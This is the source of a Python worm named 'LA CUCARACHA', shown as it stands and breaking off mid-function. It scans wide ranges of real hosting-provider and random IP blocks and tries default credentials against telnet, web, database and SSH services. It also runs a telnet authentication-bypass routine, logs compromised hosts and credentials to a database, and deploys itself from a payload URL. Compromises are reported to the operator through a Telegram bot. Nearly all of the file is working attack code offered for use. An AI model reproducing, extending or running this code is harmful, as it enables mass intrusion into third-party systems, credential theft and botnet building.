#!/usr/bin/env python3
"""
LA CUCARACHA — Definitive Smart Monster
Full-spectrum autonomous worm with IF/THEN decision engine,
multi-vector exploitation, deployment, and Telegram reporting.
by🇭🇷PhonkAlphabet
"""

import base64
import concurrent.futures
import hashlib
import hmac
import json
import logging
import os
import random
import re
import shutil
import signal
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from collections import defaultdict, deque
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("lacucaracha")

# ─── VERSION ────────────────────────────────────────────────────────
VERSION = "4.0"

# ─── PATHS ──────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs")
DB_PATH = os.path.join(BASE_DIR, "worm_mesh.db")
CONFIG_PATH = os.path.join(BASE_DIR, "telegram_config.json")
DB_LOCK = threading.Lock()

# ─── C2 CONFIG ──────────────────────────────────────────────────────
C2_HOST = "127.0.0.1"
C2_PORT = 10002
PAYLOAD_URL = f"http://{C2_HOST}:10004/LaCucaracha.py"

# ─── MASSCAN ────────────────────────────────────────────────────────
MASSCAN_RATE = 5000
MASSCAN_WAIT = 3
MASSCAN_PORTS = ",".join([
    "23", "22", "2222", "80", "443", "8080", "8443", "7547",
    "3000", "5000", "7000", "8888", "9092", "9200", "9443", "9999",
    "3306", "5432", "27017", "6379", "5900", "3389",
])

# ─── EMOJI DICT ─────────────────────────────────────────────────────
E = {
    "worm": "\U0001f41b", "skull": "\U0001f480", "target": "\U0001f3af",
    "node": "\U0001f5a5", "success": "\u2705", "fail": "\u274c",
    "warning": "\u26a0\ufe0f", "info": "\u2139\ufe0f", "stats": "\U0001f4ca",
    "scan": "\U0001f50d", "exploit": "\U0001f4a5", "deploy": "\U0001f4e6",
    "mesh": "\U0001f578", "c2": "\U0001f4e1", "alert": "\U0001f6a8",
    "lock": "\U0001f512", "key": "\U0001f511", "db": "\U0001f5c4",
    "cpu": "\u2699\ufe0f", "memory": "\U0001f9e0", "network": "\U0001f310",
    "time": "\u23f0", "flag": "\U0001f3f4", "fire": "\U0001f525",
    "shield": "\U0001f6e1", "bot": "\U0001f916", "admin": "\U0001f451",
    "chart": "\U0001f4c8", "rocket": "\U0001f680", "gear": "\u2699\ufe0f",
    "crown": "\U0001f451", "sword": "\u2694\ufe0f", "diamond": "\U0001f48e",
    "star": "\u2b50", "dragon": "\U0001f409", "phoenix": "\U0001f525",
    "trophy": "\U0001f3c6", "medal": "\U0001f396", "lightning": "\u26a1",
    "boom": "\U0001f4a5", "radioactive": "\u2622\ufe0f", "biohazard": "\u2623\ufe0f",
    "satellite": "\U0001f4f0", "radar": "\U0001f4e1", "terminal": "\U0001f5a5",
    "chip": "\U0001f4bb", "server": "\U0001f5c4", "cloud": "\u2601\ufe0f",
    "firewall": "\U0001f9f1", "backdoor": "\U0001f6aa", "shell": "\U0001f41a",
    "root": "\U0001f331", "refresh": "\U0001f504", "close": "\u274c",
    "dashboard": "\U0001f3ae", "status": "\U0001f4e1", "telnet": "\U0001f510",
    "web": "\U0001f310", "ssh": "\U0001f511", "rdp": "\U0001f5a5",
    "vnc": "\U0001f5bc", "heartbeat": "\U0001f493", "error": "\U0001f525",
    "queue": "\U0001f4cb", "batch": "\U0001f4ca", "cred": "\U0001f511",
    "uptime": "\u23f1\ufe0f", "report": "\U0001f4ca", "summary": "\U0001f4c8",
    "decision": "\U0001f9e0", "rotate": "\U0001f504", "sleep": "\U0001f4a4",
    "idle": "\U0001f6cb", "hunt": "\U0001f43e", "pwn": "\U0001f3c6",
    "alive": "\u2705", "dead": "\u274c", "timeout": "\u23f1\ufe0f",
    "retry": "\U0001f501", "skip": "\u23ed\ufe0f", "wake": "\U0001f305",
    "ssh": "\U0001f511", "telnet": "\U0001f510", "web": "\U0001f310",
    "db": "\U0001f5c4", "redis": "\U0001f5c4", "mongo": "\U0001f5c4",
    "mysql": "\U0001f5c4", "postgres": "\U0001f5c4", "elastic": "\U0001f5c4",
    "boot": "\U0001f680", "shutdown": "\U0001f4a4", "phase": "\U0001f3af",
    "attempt": "\U0001f50b", "attack": "\U00002694",
}
EMOJI = E

# ─── SERVICE PRIORITY MAP ───────────────────────────────────────────
SERVICE_PRIORITY = {
    23: 100, 7547: 95, 80: 85, 443: 84, 8080: 83, 8443: 82,
    3000: 80, 5000: 79, 7000: 78, 8888: 77, 9092: 76, 9200: 75,
    9443: 74, 9999: 73, 3306: 60, 5432: 59, 27017: 58, 6379: 57,
    5900: 40, 3389: 39, 22: 10, 2222: 9,
}

SERVICE_EMOJI = {
    23: "\U0001f510", 22: "\U0001f511", 2222: "\U0001f511",
    80: "\U0001f310", 443: "\U0001f310", 8080: "\U0001f310", 8443: "\U0001f310",
    3000: "\U0001f310", 5000: "\U0001f310", 7000: "\U0001f310", 8888: "\U0001f310",
    3306: "\U0001f5c4", 5432: "\U0001f5c4", 27017: "\U0001f5c4", 6379: "\U0001f5c4",
    7547: "\U0001f4e1", 5900: "\U0001f5bc", 3389: "\U0001f5a5",
}

SERVICE_NAME = {
    23: "Telnet", 22: "SSH", 2222: "SSH-ALT",
    80: "HTTP", 443: "HTTPS", 8080: "HTTP-ALT", 8443: "HTTPS-ALT",
    3000: "Gitea/Node", 5000: "Flask/Django", 7000: "Spring/Java",
    8888: "Jupyter/Webmin", 3306: "MySQL", 5432: "PostgreSQL",
    27017: "MongoDB", 6379: "Redis", 7547: "TR-069",
    5900: "VNC", 3389: "RDP", 9092: "Kafka", 9200: "Elasticsearch",
    9443: "HTTPS-ALT", 9999: "Monitoring",
}

# ─── SPIDER SUBNETS ─────────────────────────────────────────────────
random.seed()
SPIDER_SUBNETS = []
for oct in range(0, 256):
    SPIDER_SUBNETS.append(f"159.89.{oct}.0/24")
    SPIDER_SUBNETS.append(f"159.223.{oct}.0/24")
    SPIDER_SUBNETS.append(f"167.71.{oct}.0/24")
    SPIDER_SUBNETS.append(f"137.184.{oct}.0/24")
    SPIDER_SUBNETS.append(f"143.110.{oct}.0/24")
    SPIDER_SUBNETS.append(f"157.230.{oct}.0/24")
    SPIDER_SUBNETS.append(f"138.68.{oct}.0/24")
    SPIDER_SUBNETS.append(f"165.22.{oct}.0/24")
    SPIDER_SUBNETS.append(f"128.199.{oct}.0/24")
    SPIDER_SUBNETS.append(f"178.128.{oct}.0/24")
    SPIDER_SUBNETS.append(f"188.166.{oct}.0/24")
    SPIDER_SUBNETS.append(f"206.189.{oct}.0/24")
    SPIDER_SUBNETS.append(f"46.101.{oct}.0/24")
    SPIDER_SUBNETS.append(f"159.65.{oct}.0/24")
    SPIDER_SUBNETS.append(f"104.248.{oct}.0/24")
    SPIDER_SUBNETS.append(f"49.12.{oct}.0/24")
    SPIDER_SUBNETS.append(f"65.21.{oct}.0/24")
    SPIDER_SUBNETS.append(f"95.217.{oct}.0/24")
SPIDER_SUBNETS += [f"103.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(500)]
SPIDER_SUBNETS += [f"41.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"89.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"91.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"95.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"185.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"31.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"45.{random.randint(0,128)}.{random.randint(0,255)}.0/24" for _ in range(200)]

# ─── CREDENTIAL DATABASES ───────────────────────────────────────────
TELNET_CREDS = [
    ("root", ""), ("root", "root"), ("root", "admin"),
    ("root", "1234"), ("root", "xc3511"), ("root", "vizxv"),
    ("root", "Zte521"), ("root", "anko"), ("root", "realtek"),
    ("root", "default"), ("root", "pass"), ("root", "12345"),
    ("root", "54321"), ("root", "7ujMko0vizxv"), ("root", "system"),
    ("admin", ""), ("admin", "admin"), ("admin", "1234"),
    ("admin", "password"), ("admin", "12345"), ("admin", "123456"),
    ("admin", "1111"), ("admin", "1111111"), ("admin", "123456789"),
    ("service", "service"), ("user", "user"), ("guest", "guest"),
    ("support", "support"), ("ubnt", "ubnt"), ("cisco", "cisco"),
    ("super", "super"), ("Admin", "12345"), ("Admin", "admin"),
    ("root", "hi3518"), ("root", "jvbzd"), ("root", "osminox"),
    ("root", "dreambox"), ("root", "samsung"),
    ("admin", "meinsm"), ("admin", "tlJwpbo6"),
    ("admin", "Zte521"), ("admin", "pass"), ("admin", "default"),
    ("root", "12345678"), ("admin", "12345678"),
    ("admin", "admin123"), ("admin", "p@ssw0rd"),
    ("root", "P@ssw0rd"), ("admin", "changeme"),
    ("root", "changeme"), ("admin", "letmein"),
    ("-froot", ""), ("\x00root", ""), ("\x00admin", ""),
]

WEB_CREDS = TELNET_CREDS + [
    ("admin", "admin123"), ("admin", "password123"),
    ("admin", "letmein"), ("admin", "changeme"),
    ("admin", "passw0rd"), ("admin", "qwerty"),
    ("admin", "12345678"), ("admin", "P@ssw0rd"),
    ("root", "P@ssw0rd"), ("admin", "administrator"),
    ("admin", "default"), ("admin", "temp123"),
    ("admin", "test123"), ("Administrator", "password"),
    ("admin", "demo"), ("admin", "test"), ("admin", "root"),
    ("root", "toor"), ("admin", "123456"), ("root", "123456"),
    ("admin", "password"), ("root", "password"),
]

DB_CREDS = [
    ("root", ""), ("root", "root"), ("root", "password"),
    ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"),
    ("admin", ""), ("admin", "admin"), ("admin", "password"),
    ("postgres", ""), ("postgres", "postgres"),
    ("mongodb", ""), ("mongodb", "mongodb"),
    ("redis", ""), ("redis", "redis"),
]

SSH_CREDS = [
    ("root", "root"), ("root", "admin"), ("root", "password"),
    ("root", "P@ssw0rd"), ("root", "123456"), ("root", ""),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("ubuntu", "ubuntu"), ("deploy", "deploy"),
    ("www-data", "www-data"), ("nagios", "nagios"),
    ("test", "test"), ("pi", "raspberry"),
    ("user", "user"), ("guest", "guest"),
    ("oracle", "oracle"), ("tomcat", "tomcat"),
    ("root", "toor"), ("root", "12345"),
    ("admin", "12345"), ("admin", "admin123"),
]

ALL_CREDS = list(set(TELNET_CREDS + WEB_CREDS + DB_CREDS + SSH_CREDS))

# ─── BOX ART ────────────────────────────────────────────────────────
BOX_TOP = "\u2554" + "\u2550" * 68 + "\u2557"
BOX_SEP = "\u2560" + "\u2550" * 68 + "\u2563"
BOX_BOT = "\u255a" + "\u2550" * 68 + "\u255d"
BOX_CONT = "\u2551"
CFTimeoutError = concurrent.futures.TimeoutError


# ═════════════════════════════════════════════════════════════════════
# TELEGRAM REPORTER — Async Non-Blocking Queue
# ═════════════════════════════════════════════════════════════════════

class TelegramReporter:
    """Async Telegram reporter. Short calls are batched and flushed as one message."""

    def __init__(self, token: str, admin_ids: List[int] = None,
                 dry_run: bool = False):
        self.token = token
        self.admin_ids = admin_ids or [0, 0]
        self._base_url = f"https://api.telegram.org/bot{token}"
        self._dry_run = dry_run
        self._ctx: Optional[ssl.SSLContext] = None
        self._queue: deque = deque()
        self._stop = False
        self._sent_count = 0
        self._dropped_count = 0
        self._thread: Optional[threading.Thread] = None

        # Batching for short() calls
        self._short_batch: List[str] = []
        self._last_batch_flush = time.time()
        self._batch_lock = threading.Lock()
        self._BATCH_LINES = 15
        self._BATCH_SECS = 10

        if not dry_run and token:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                self._ctx = ctx
            except Exception:
                pass
            self._thread = threading.Thread(target=self._sender_loop,
                                            daemon=True, name="tg-sender")
            self._thread.start()
            self._flush_thread = threading.Thread(target=self._periodic_batch_flusher,
                                                  daemon=True, name="tg-batcher")
            self._flush_thread.start()

    def _periodic_batch_flusher(self) -> None:
        """Periodically flush the short batch even if it hasn't hit line cap."""
        while not self._stop:
            time.sleep(self._BATCH_SECS)
            self._flush_short_batch()

    def _flush_short_batch(self) -> None:
        """Flush accumulated short() lines as a single batch message."""
        with self._batch_lock:
            if not self._short_batch:
                return
            lines = self._short_batch[:]
            self._short_batch.clear()
            self._last_batch_flush = time.time()

        now = datetime.now().strftime("%H:%M:%S")
        content = "\n".join(lines)
        if len(content) > 3900:
            content = content[:3870] + "\n║ … +more"
        text = (
            f"```\n"
            f"╔═══════════════════════════════════════════════════════╗\n"
            f"║  LA CUCARACHA v4.0  •  LIVE REPORT  ║\n"
            f"╠═══════════════════════════════════════════════════════╣\n"
            f"{content}\n"
            f"╠═══════════════════════════════════════════════════════╣\n"
            f"║  🕐 {now}  │  📨 queued:{len(self._queue)}  │  sent:{self._sent_count}  ║\n"
            f"╚═══════════════════════════════════════════════════════╝\n"
            f"```"
        )
        self._queue.append(text)

    def _sender_loop(self) -> None:
        _last_send = 0.0
        _rate_hits = 0
        _min_gap = 1.2
        while not self._stop:
            try:
                text = self._queue.popleft()
            except IndexError:
                time.sleep(0.3)
                continue
            if len(self._queue) > 200:
                dropped = len(self._queue)
                self._dropped_count += dropped
                self._queue.clear()
                log.warning(f"TG queue overflow: dropped {dropped} (cap 200)")
                continue
            if len(text) > 4096:
                text = text[:4070] + "\n\u2026 truncated"
            now = time.time()
            if now - _last_send < _min_gap:
                time.sleep(_min_gap - (now - _last_send))
            for attempt in range(2):
                try:
                    payload = json.dumps({
                        "chat_id": self.admin_ids[0],
                        "text": text,
                        "parse_mode": "MarkdownV2",
                    }).encode()
                    req = urllib.request.Request(
                        f"{self._base_url}/sendMessage",
                        data=payload,
                        headers={"Content-Type": "application/json"},
                        method="POST",
                    )
                    resp = urllib.request.urlopen(req, timeout=8, context=self._ctx)
                    _last_send = time.time()
                    _rate_hits = 0
                    self._sent_count += 1
                    resp.read()
                    resp.close()
                    break
                except urllib.error.HTTPError as e:
                    body = e.read().decode(errors="ignore")[:200]
                    if e.code == 429:
                        retry = int(e.headers.get("Retry-After", 5))
                        _rate_hits += 1
                        time.sleep(min(retry * (1.5 ** _rate_hits), 12))
                        continue
                    log.warning(f"TG HTTP {e.code}: {body[:60]}")
                    self._dropped_count += 1
                    break
                except (socket.timeout, urllib.error.URLError):
                    if attempt < 1:
                        time.sleep(2)
                        continue
                    self._dropped_count += 1
                    break
                except Exception as e:
                    log.warning(f"TG send err: {e}")
                    if attempt < 1:
                        time.sleep(1)
                        continue
                    self._dropped_count += 1
                    break

    def msg(self, title: str, lines: List[str]) -> None:
        now = datetime.now().strftime("%H:%M:%S")
        content = "\n".join(
            f"{BOX_CONT} {line}" if not line.startswith("\u2551") else line
            for line in lines
        )
        if len(content) > 3900:
            content = content[:3900] + "\n\u2551 \u2026 truncated"
        text = (
            f"```\n{BOX_TOP}\n"
            f"{BOX_CONT} {title}\n"
            f"{BOX_SEP}\n"
            f"{content}\n"
            f"{BOX_CONT} \U0001f550 {now}\n"
            f"{BOX_BOT}\n```"
        )
        self._queue.append(text)

    def short(self, action: str, target: str, status: str, detail: str = "") -> None:
        e = E.get(action.lower(), "\u26a1")
        now = datetime.now().strftime("%H:%M:%S")
        d = f" | {detail}" if detail else ""
        line = f"\u2551 {e} {action} \u2192 {target} [{status}{d}] @{now}"

        # Store PWNED/ERROR lines separately for instant send (critical)
        if action.upper() in ("PWN", "ERROR", "SHUTDOWN"):
            # Send PWNED immediately as standalone
            BX = "\u2550"
            text = (
                f"```\n"
                f"\u2554{BX}{BX} {e} {action} {BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}\u2557\n"
                f"\u2551 \U0001f3af {target}\n"
                f"\u2551 \U0001f4ca {status}{d}\n"
                f"\u2551 \U0001f550 {now}\n"
                f"\u255a{BX*28}\u255d\n"
                f"```"
            )
            self._queue.append(text)
        else:
            # Batch all non-critical events
            with self._batch_lock:
                self._short_batch.append(line)
                if len(self._short_batch) >= self._BATCH_LINES or \
                   (time.time() - self._last_batch_flush) >= self._BATCH_SECS:
                    self._flush_short_batch()

    def decision(self, if_condition: str, then_action: str, target: str = "") -> None:
        now = datetime.now().strftime("%H:%M:%S")
        BX = "\u2550"
        DASH = "\u2014"
        text = (
            f"```\n"
            f"\u2554{BX}{BX} \U0001f9e0 DECISION {BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}{BX}\u2557\n"
            f"\u2551 IF {if_condition}\n"
            f"\u2551 THEN \u2192 {then_action}\n"
            f"\u2551 \U0001f3af {target if target else DASH}\n"
            f"\u2551 \U0001f550 {now}\n"
            f"\u255a{BX*28}\u255d\n"
            f"```"
        )
        self._queue.append(text)

    def raw(self, text: str) -> None:
        self._queue.append(text)

    def flush(self, timeout: float = 10.0) -> int:
        self._flush_short_batch()
        t0 = time.time()
        while self._queue and (time.time() - t0) < timeout:
            time.sleep(0.5)
        return len(self._queue)

    def stats(self) -> Dict:
        return {"sent": self._sent_count, "dropped": self._dropped_count,
                "queued": len(self._queue)}


# ═════════════════════════════════════════════════════════════════════
# SMART DATABASE — WAL Mode with Auto-Recovery
# ═════════════════════════════════════════════════════════════════════

class SmartDB:
    """WAL-mode DB with auto-recovery and retry."""

    def __init__(self, path: str = DB_PATH):
        self.path = path
        self._conn: Optional[sqlite3.Connection] = None
        self._connect()

    def _connect(self) -> None:
        os.makedirs(os.path.dirname(self.path) or ".", exist_ok=True)
        c = sqlite3.connect(self.path, check_same_thread=False, timeout=15)
        c.row_factory = sqlite3.Row
        c.execute("PRAGMA journal_mode=WAL")
        c.execute("PRAGMA busy_timeout=15000")
        c.execute("PRAGMA synchronous=NORMAL")
        c.execute("PRAGMA cache_size=-8000")
        c.execute("PRAGMA temp_store=MEMORY")
        self._conn = c
        self._ensure_schema()

    def _ensure_schema(self) -> None:
        schemas = [
            """CREATE TABLE IF NOT EXISTS targets (
                id TEXT PRIMARY KEY, ip TEXT, port INTEGER DEFAULT 22,
                protocol TEXT DEFAULT 'tcp', service TEXT DEFAULT '',
                banner TEXT DEFAULT '', os_guess TEXT DEFAULT '',
                confidence REAL DEFAULT 0.0, exploited INTEGER DEFAULT 0,
                scanned INTEGER DEFAULT 0, first_seen TEXT, last_seen TEXT,
                scan_source TEXT DEFAULT 'smart')""",
            """CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT, username TEXT, password TEXT,
                UNIQUE(target_ip, username, password))""",
            """CREATE TABLE IF NOT EXISTS nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                node_id TEXT UNIQUE, ip TEXT, port INTEGER,
                hostname TEXT, os TEXT, status TEXT DEFAULT 'active',
                last_seen TEXT, first_seen TEXT,
                version TEXT, capabilities TEXT)""",
            """CREATE TABLE IF NOT EXISTS deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT, payload_type TEXT, payload_hash TEXT,
                deployed_at TEXT, status TEXT DEFAULT 'active',
                callback_count INTEGER DEFAULT 0)""",
            """CREATE TABLE IF NOT EXISTS operations_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT, level TEXT, source TEXT, message TEXT)""",
        ]
        for sql in schemas:
            try:
                self._conn.execute(sql)
            except Exception:
                pass
        for col_sql in [
            "ALTER TABLE targets ADD COLUMN scan_source TEXT DEFAULT 'smart'",
            "ALTER TABLE targets ADD COLUMN exploited INTEGER DEFAULT 0",
        ]:
            try:
                self._conn.execute(col_sql)
            except sqlite3.OperationalError:
                pass
        try:
            self._conn.commit()
        except Exception:
            pass

    def q(self, sql: str, params: tuple = ()) -> Optional[List[Dict]]:
        with DB_LOCK:
            for a in range(3):
                try:
                    cur = self._conn.execute(sql, params)
                    if sql.strip().upper().startswith("SELECT"):
                        return [dict(r) for r in cur.fetchall()]
                    self._conn.commit()
                    return None
                except sqlite3.DatabaseError as e:
                    log.error(f"DB err (a{a+1}): {e}")
                    if "malformed" in str(e):
                        self._recover()
                    elif a < 2:
                        time.sleep(1)
                    else:
                        raise
                except sqlite3.OperationalError as e:
                    if "locked" in str(e) or "transaction" in str(e):
                        try:
                            self._conn.rollback()
                        except Exception:
                            pass
                        time.sleep(1)
                        continue
                    log.error(f"DB op err: {e}")
                    return None
            return None

    def _recover(self) -> None:
        log.warning("\u26a0\ufe0f DB corrupt \u2014 recovering")
        try:
            self._conn.close()
        except Exception:
            pass
        backup = f"{self.path}.bak.{int(time.time())}"
        try:
            shutil.copy2(self.path, backup)
            log.info(f"Backup saved: {backup}")
        except Exception:
            pass
        time.sleep(1)
        try:
            os.remove(self.path)
        except Exception:
            pass
        self._connect()

    def stats(self) -> Dict[str, int]:
        s: Dict[str, int] = {"targets": 0, "exploited": 0, "credentials": 0,
                              "nodes": 0, "deployments": 0}
        try:
            r = self.q("SELECT COUNT(*) as c FROM targets")
            if r: s["targets"] = r[0]["c"]
            r = self.q("SELECT COUNT(*) as c FROM targets WHERE exploited=1")
            if r: s["exploited"] = r[0]["c"]
            r = self.q("SELECT COUNT(*) as c FROM credentials")
            if r: s["credentials"] = r[0]["c"]
            r = self.q("SELECT COUNT(*) as c FROM nodes")
            if r: s["nodes"] = r[0]["c"]
            r = self.q("SELECT COUNT(*) as c FROM deployments")
            if r: s["deployments"] = r[0]["c"]
        except Exception:
            pass
        return s

    def port_breakdown(self) -> List[Dict]:
        r = self.q("SELECT port, COUNT(*) as c FROM targets GROUP BY port ORDER BY c DESC LIMIT 12")
        return r or []

    def get_creds(self) -> List[Tuple[str, str]]:
        r = self.q("SELECT DISTINCT username, password FROM credentials WHERE username != '' AND password != ''")
        return [(x["username"], x["password"]) for x in (r or [])]

    def get_unexploited(self, limit: int = 200) -> List[Dict]:
        r = self.q("SELECT * FROM targets WHERE exploited=0 ORDER BY last_seen DESC LIMIT ?", (limit,))
        return r or []

    def mark_exploited(self, ip: str, port: int, user: str = "", pwd: str = "") -> None:
        self.q("UPDATE targets SET exploited=1 WHERE ip=? AND port=?", (ip, port))
        if user and pwd:
            self.q("INSERT OR IGNORE INTO credentials (target_ip, username, password) VALUES (?, ?, ?)",
                   (ip, user, pwd))

    def add_target(self, ip: str, port: int, protocol: str = "tcp",
                   service: str = "", banner: str = "") -> None:
        now = datetime.now(timezone.utc).isoformat()
        tid = f"{ip}:{port}"
        self.q("INSERT OR IGNORE INTO targets (id, ip, port, protocol, service, banner, first_seen, last_seen, scan_source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'smart')",
               (tid, ip, port, protocol, service, banner[:200], now, now))

    def close(self) -> None:
        if self._conn:
            try:
                self._conn.close()
            except Exception:
                pass


# ═════════════════════════════════════════════════════════════════════
# IF/THEN DECISION ENGINE
# ═════════════════════════════════════════════════════════════════════

class DecisionEngine:
    """IF/THEN decision engine for autonomous operation."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self.epoch = 0
        self.start_time = time.time()
        self._stop = False
        self._empty_streak = 0
        self._hit_streak = 0
        self._last_decision = ""
        self.stats = {
            "epochs": 0, "scanned": 0, "exploited": 0,
            "telnet_pwned": 0, "web_pwned": 0, "db_pwned": 0, "ssh_pwned": 0,
            "telnet_live": 0, "web_live": 0, "cred_reuse": 0,
        }

    def decide(self, phase: str, result: Dict) -> str:
        count = result.get("count", 0)
        success = result.get("success", False)
        targets = result.get("targets", [])

        if count > 0 or success:
            self._hit_streak += 1
            self._empty_streak = 0
        else:
            self._empty_streak += 1
            self._hit_streak = 0

        if phase == "DISCOVER":
            if count > 0:
                self.r.decision(f"targets found", f"EXPLOIT ({count} hosts)", f"{len(targets)} targets")
                self._last_decision = f"DISCOVER: {count} found \u2192 EXPLOIT"
                return "EXPLOIT"
            elif self._empty_streak >= 3:
                self.r.decision(f"{self._empty_streak}x empty", "ROTATE subnet", "fresh range")
                self._last_decision = f"DISCOVER: {self._empty_streak}x empty \u2192 ROTATE"
                return "DISCOVER"
            else:
                self.r.decision(f"empty ({self._empty_streak+1})", "RETRY scan", "same subnet")
                self._last_decision = f"DISCOVER: empty \u2192 RETRY"
                return "DISCOVER"

        elif phase == "EXPLOIT":
            if count > 0:
                self.r.decision(f"{count} pwned", f"DEPLOY ({count} hosts)", "deploy payloads")
                self._last_decision = f"EXPLOIT: {count} pwned \u2192 DEPLOY"
                return "DEPLOY"
            elif self.stats.get("telnet_live", 0) > 0 and self.stats.get("telnet_pwned", 0) == 0:
                self.r.decision("telnet live but no pwn", "RETRY TELNET", "with CVE-2026 vectors")
                self._last_decision = "EXPLOIT: telnet live \u2192 RETRY_TELNET"
                return "EXPLOIT"
            elif self.stats.get("web_live", 0) > 0 and self.stats.get("web_pwned", 0) == 0:
                self.r.decision("web live but no pwn", "RETRY WEB", "with expanded creds")
                self._last_decision = "EXPLOIT: web live \u2192 RETRY_WEB"
                return "EXPLOIT"
            elif self._hit_streak > 0:
                self.r.decision("hit streak", "CONTINUE EXPLOIT", "next batch")
                self._last_decision = "EXPLOIT: hit streak \u2192 CONTINUE"
                return "EXPLOIT"
            else:
                self.r.decision("no pwn", "SLEEP", "rest before next epoch")
                self._last_decision = "EXPLOIT: no pwn \u2192 SLEEP"
                return "SLEEP"

        elif phase == "DEPLOY":
            if count > 0:
                self.r.decision(f"{count} deployed", "SPREAD", "mesh expansion")
                self._last_decision = f"DEPLOY: {count} deployed \u2192 SPREAD"
                return "SPREAD"
            else:
                self.r.decision("no deployment", "SLEEP", "next epoch")
                self._last_decision = "DEPLOY: none \u2192 SLEEP"
                return "SLEEP"

        elif phase == "SLEEP":
            if self._hit_streak > 3:
                self.r.decision(f"hot streak ({self._hit_streak})", "SHORT SLEEP", "keep momentum")
                self._last_decision = "SLEEP: hot \u2192 short"
            elif self._empty_streak > 5:
                self.r.decision(f"cold zone ({self._empty_streak})", "LONG SLEEP", "rotate subnets")
                self._last_decision = "SLEEP: cold \u2192 long"
            else:
                self.r.decision("standard", "NORMAL SLEEP", "balanced rest")
                self._last_decision = "SLEEP: normal"
            return "DISCOVER"

        self.r.decision("unknown phase", "RESET to DISCOVER", phase)
        return "DISCOVER"

    def get_decision_summary(self) -> str:
        return self._last_decision or "No decisions yet"


# ═════════════════════════════════════════════════════════════════════
# EXPLOIT ENGINES — Telnet, Web, DB, SSH
# ═════════════════════════════════════════════════════════════════════

class TelnetExploitEngine:
    """Telnet exploitation with CVE-2026 vectors and credential spray."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self._stop = False

    def stop(self):
        self._stop = True

    def _check(self, ip: str, port: int = 23) -> Optional[Dict]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((ip, port))
            data = s.recv(2048).decode(errors="ignore").lower()
            s.close()
            if any(kw in data for kw in ["login", "user", "password",
                                          "username", "password:", "login:"]):
                return {"ip": ip, "port": port, "service": "telnet",
                        "status": "live", "banner": data[:120].strip()}
            return {"ip": ip, "port": port, "service": "telnet",
                    "status": "no_login", "banner": data[:80].strip()}
        except socket.timeout:
            return {"ip": ip, "port": port, "service": "telnet", "status": "timeout"}
        except (ConnectionRefusedError, OSError):
            return {"ip": ip, "port": port, "service": "telnet", "status": "refused"}
        except Exception:
            return None

    def _login(self, ip: str, port: int, user: str, pwd: str) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((ip, port))
            time.sleep(0.5)
            data = s.recv(2048).decode(errors="ignore")

            if "login:" in data or "username:" in data:
                s.send(f"{user}\n".encode())
                time.sleep(0.3)
                data2 = s.recv(2048).decode(errors="ignore")
                if "password:" in data2.lower() or "pass:" in data2.lower():
                    s.send(f"{pwd}\n".encode())
                    time.sleep(0.5)
                    data3 = s.recv(4096).decode(errors="ignore")
                    s.close()
                    if any(kw in data3 for kw in ["$ ", "# ", "]# ", "sh-", "busybox", "C:\\", "> "]):
                        return True
                    if "incorrect" not in data3.lower() and "invalid" not in data3.lower() and "failed" not in data3.lower():
                        if len(data3) > 20 and any(kw in data3 for kw in ["\n", "\r\n", "]#"]):
                            return True
            elif "password:" in data.lower():
                s.send(f"{pwd}\n".encode())
                time.sleep(0.5)
                data3 = s.recv(4096).decode(errors="ignore")
                s.close()
                if any(kw in data3 for kw in ["$", "#", ">"]):
                    return True
            s.close()
            return False
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            return False

    def _cve_2026_bypass(self, ip: str, port: int = 23) -> Optional[Dict]:
        vectors = [
            (b"-froot", b""),
            (b"\x00root", b""),
            (b"\x00admin", b""),
        ]
        for username_bytes, password_bytes in vectors:
            if self._stop:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect((ip, port))
                banner = sock.recv(1024)
                if b"login:" in banner.lower() or b"username:" in banner.lower():
                    sock.send(username_bytes + b"\n")
                    time.sleep(0.3)
                    resp = sock.recv(1024)
                    if b"password" in resp.lower() or b"Password" in resp:
                        if password_bytes:
                            sock.send(password_bytes + b"\n")
                        else:
                            sock.send(b"\n")
                        time.sleep(0.5)
                        post_auth = sock.recv(1024)
                    else:
                        post_auth = resp
                    if b"#" in post_auth or b"$" in post_auth or b">" in post_auth:
                        sock.send(b"id\n")
                        time.sleep(0.3)
                        verify = sock.recv(1024)
                        if b"uid=" in verify:
                            sock.close()
